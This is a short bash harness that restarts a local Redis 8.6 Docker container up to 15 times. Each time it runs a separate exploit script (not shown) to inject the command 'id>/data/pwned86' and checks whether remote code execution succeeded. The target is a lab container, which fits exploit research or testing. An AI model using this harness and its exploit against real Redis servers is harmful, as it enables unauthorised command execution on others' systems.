#!/bin/bash
# Boot-retry wrapper: offsets are boot-invariant, leaks are redone each boot.
for i in $(seq 1 15); do
  echo "=== boot $i ==="
  docker rm -f r86 >/dev/null 2>&1
  docker run -d --name r86 -p 16486:6379 redis:8.6 redis-server --requirepass exploitme --enable-debug-command yes >/dev/null
  sleep 1
  python3 /home/c/fuckredis/P86_exploit.py 127.0.0.1 16486 exploitme "id>/data/pwned86" && {
    if docker exec r86 test -f /data/pwned86 2>/dev/null; then
      echo "[+] PWNED:"; docker exec r86 cat /data/pwned86; exit 0
    fi
  }
done
echo "[-] no luck after 15 boots"; exit 1
